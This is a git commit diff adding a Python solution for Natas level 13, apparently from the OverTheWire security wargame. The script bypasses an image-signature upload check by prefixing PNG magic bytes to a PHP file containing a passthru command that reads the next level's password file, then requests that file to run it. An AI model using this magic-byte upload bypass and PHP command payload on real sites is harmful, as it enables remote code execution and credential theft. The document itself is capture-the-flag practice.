6e224c3a8e771d1d93529835ff8d6a894709117f
Evan Johnson <evanj2357@gmail.com>
2021-06-21 14:33:56 -0700

    level solved!

--- solutions/natas13.py
+++ solutions/natas13.py
@@ -1,16 +1,35 @@
 """
-natas13:
+natas13: file upload checks for image file signatures but accepts any extension
 """
 
+import re
 import requests
+from bs4 import BeautifulSoup
 from typing import Optional
 
 from natas_utils import *
 
 LEVEL = 13
 
+PNG_FIRST_BYTES = bytes.fromhex("89504e470d0a1a0a")
+
 def solve(url: str, login: LevelLogin) -> Optional[str]:
-    return None
+    data = {
+        "filename": "pwn.php",
+    }
+    payload = {
+        "uploadedfile": PNG_FIRST_BYTES + bytes(f"<? passthru('cat {NATAS_DATA['flag_path']}natas{LEVEL + 1}'); ?>", "utf8"),
+    }
+    response = requests.post(url, auth=login, data=data, files=payload)
+    response.raise_for_status()
+
+    page_content = BeautifulSoup(response.text, "html.parser").find("div", attrs={"id": "content"})
+    uploaded_payload_path = page_content.find("a", attrs={"href": re.compile(r'.php$')}).get("href")
+
+    response = requests.get(f"{url}/{uploaded_payload_path}", auth=login)
+
+    # the flag _should_ be the only text in the response, but test it to be sure
+    return try_level_login(LEVEL + 1, extract_candidate_passwords(response.text, in_html_body=False))
 
 if __name__ == "__main__":
     url, login = load_level(LEVEL)
